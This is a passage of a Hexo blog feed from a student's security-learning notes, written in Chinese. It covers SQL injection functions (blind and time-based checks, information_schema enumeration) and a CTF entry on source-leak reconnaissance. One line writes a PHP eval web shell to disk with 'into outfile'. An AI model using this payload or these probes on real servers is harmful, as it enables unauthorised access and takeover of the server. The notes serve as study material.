class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> if (<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><ul><li>mid(a,b,c) 从b位置开始，截取a字符串的c位</li><li>mid()字符串的下标是从1开始算的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228132919936.png" alt="image-20230228132919936"></p><h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><ul><li>substr(a,b,c) 从b位置开始，截取字符串a长度为c的字符串，这个与mid不同的是substr的b和c可以自动取整 substr从1开始计位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133303859.png" alt="image-20230228133303859"></p><h3 id="left"><a href="#left" class="headerlink" title="left"></a>left</h3><ul><li>left(a,b) 从左侧截取a的前b位</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;st&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133514200.png" alt="image-20230228133514200"></p><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><ul><li>length()判断长度 比如说length(database())&#x3D;8 判断数据库名的长度是不是等于8</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133712719.png" alt="image-20230228133712719"></p><h3 id="ord-ascii"><a href="#ord-ascii" class="headerlink" title="ord ascii"></a>ord ascii</h3><ul><li>ord()返回目标对应的ascii码值 ascii()与ord一致</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ord(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ascii(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228134029242.png" alt="image-20230228134029242"></p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><ul><li>返回几列 比如limit(1,2)的意思就是从第一列开始返回2列 limit是从0开始计数的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;students&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228134316450.png" alt="image-20230228134316450"></p><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><ul><li>连接一个或多个字符串</li><li>concat_ws ：与concat基本一致，多了参数分隔符</li><li>group_concat()：连接每一个字符串默认以逗号分割的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;stu&#x27;</span>,<span class="hljs-string">&#x27;dent&#x27;</span>);<br><span class="hljs-keyword">select</span> group_concat(database(),version());<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151005441.png" alt="image-20230228151005441"></p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151225977.png" alt="image-20230228151225977"></p><h3 id="into-outfile写文件"><a href="#into-outfile写文件" class="headerlink" title="into outfile写文件"></a>into outfile写文件</h3><ul><li>magic_quotes_gpc&#x3D;OFF</li><li>用户有写权限</li><li>不能覆盖已经存在的文件</li><li>必须是最后一个查询语句</li><li>知道网站的绝对路径</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;c:\www\1.php &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><ul><li>向下取整</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151724767.png" alt="image-20230228151724767"></p><h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue"></a>extractValue</h3><ul><li>从目标xml中返回包含所查询的字符串</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(xml_document,xpath_string)<br>xml_document:string类型,为xml对象的名称<br>xpath_string:xpath格式的字符串<br></code></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><ul><li>修改xml文档中的内容</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(文件名，路径，数值)<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li>相当于自然对数的N次方</li><li>自然对数是以常数e为底数的对数，记作lnN（N&gt;0）。</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228153522318.png" alt="image-20230228153522318"></p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://alonglx.blog.csdn.net/article/details/124634092?spm=1001.2014.3001.5502">(91条消息) 一篇文章彻底学懂SQL注入(包含基础数据库句法、SQL注入原理以及所有常见SQL注入类型以及绕过手法)_为什么sql注入用字段_AlongLx的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/57558184">SQL基础知识总结 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>sql基础语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/02/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/02/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h3 id="1-1-robots-txt"><a href="#1-1-robots-txt" class="headerlink" title="1.1 robots.txt"></a>1.1 robots.txt</h3><p>robots.txt文件是一个文本文件，使用任何一个常见的<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91/6282252">文本编辑</a>器，比如Windows<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/56370294">系统安装</a>了Notepad，就可以创建和编辑它 .robots.txt是一个协议，而不是一个命令。robots.txt是<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F/4972146">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p><ul><li>robots协议并不是一个规范，而只是约定俗成的，不能保证网站的隐私</li></ul><h3 id="1-2-PHPs源码泄露"><a href="#1-2-PHPs源码泄露" class="headerlink" title="1.2 PHPs源码泄露"></a>1.2 PHPs源码泄露</h3><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><p>常见源码泄露类型：<a href="https://www.cnblogs.com/Lmg66/p/13598803.html">ctf常见源码泄露 - Lmg66 - 博客园 (cnblogs.com)</a></p><h3 id="1-3-常见版本控制工具"><a href="#1-3-常见版本控制工具" class="headerlink" title="1.3 常见版本控制工具"></a>1.3 常见版本控制工具</h3><ul><li><p>.svn</p></li><li><p>.git</p></li><li><p>.hg</p></li><li><p>.cvs</p></li><li><p>.开头的文件在linux里属于隐藏文件，可能未发现文件部署到生产环境中造成泄露</p></li></ul><h3 id="1-4-Vim泄露"><a href="#1-4-Vim泄露" class="headerlink" title="1.4 Vim泄露"></a>1.4 Vim泄露</h3><p><strong>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</strong></p><ul><li>在linux中的隐藏文件前面加.</li><li>缓存文件是隐藏文件例如.index.php.swp</li></ul><h3 id="1-5-php探针"><a href="#1-5-php探针" class="headerlink" title="1.5 php探针"></a>1.5 php探针</h3><p> php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p><ul><li>雅黑探针的使用<ul><li>下载到本地电脑，再用 ftp 软件上传到网站任意目录中。绑定域名后，可以用类似 域名&#x2F;tz.php 这类网址访问。</li></ul></li></ul><h3 id="1-6-常见备份文件后缀名"><a href="#1-6-常见备份文件后缀名" class="headerlink" title="1.6 常见备份文件后缀名"></a>1.6 常见备份文件后缀名</h3><p>“.git” 、“.<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a>”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”</p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2023/02/24/%E5%89%8D%E8%A8%80/"/>
    <url>/2023/02/24/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>   在大学快要两年的时间，学了不少的东西，看过不少的风景，增加了不少的经历。但是这些阅历的成长总是得不到长时间的记录，时间久了之后慢慢的淡出记忆，所以我搭建了这样一个博客来记录自己的学习和生活。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
